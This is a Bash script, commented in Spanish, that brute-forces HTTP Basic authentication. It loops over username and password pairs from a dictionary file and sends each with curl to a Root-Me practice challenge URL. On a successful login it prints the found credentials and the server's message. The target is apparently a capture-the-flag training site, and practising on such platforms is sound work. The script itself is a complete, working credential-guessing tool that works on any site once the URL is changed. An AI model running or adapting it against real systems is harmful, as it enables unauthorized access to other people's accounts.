#!/bin/bash

# Configuración con archivos separados
URL="http://challenge01.root-me.org/web-serveur/ch3/"
USUARIOS="diccionario.txt"
PASSWORDS="diccionario.txt"

# Colores
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}🔍 Iniciando fuerza bruta HTTP Basic${NC}"
echo "========================================"
echo "📂 Usuarios: $USUARIOS"
echo "📂 Contraseñas: $PASSWORDS"
echo "🌐 URL: $URL"
echo "========================================"

total=0
encontrado=0

while IFS= read -r user; do
    [ -z "$user" ] && continue
    
    while IFS= read -r pass; do
        [ -z "$pass" ] && continue
        
        total=$((total + 1))
        echo -ne "${YELLOW}🔹 Intento $total:${NC} $user:$pass\r"
        
        response=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "$URL" 2>/dev/null)
        
        if [ "$response" = "200" ]; then
            echo -e "\n${GREEN}✅ ¡ENCONTRADO!${NC}"
            echo "========================================"
            echo -e "${GREEN}👤 Usuario: $user${NC}"
            echo -e "${GREEN}🔑 Contraseña: $pass${NC}"
            echo "========================================"
            echo -e "${BLUE}📝 Mensaje del servidor:${NC}"
            curl -s -u "$user:$pass" "$URL" 2>/dev/null | grep -o "<h3>.*</h3>" | sed 's/<[^>]*>//g'
            encontrado=1
            break 2
        fi
        
    done < "$PASSWORDS"
done < "$USUARIOS"

echo ""
echo "========================================"
echo -e "${BLUE}📊 Resumen:${NC}"
echo "   Intentos totales: $total"
if [ $encontrado -eq 1 ]; then
    echo -e "   ${GREEN}✅ Credenciales encontradas${NC}"
else
    echo -e "   ${RED}❌ No se encontraron credenciales válidas${NC}"
fi
echo "========================================"
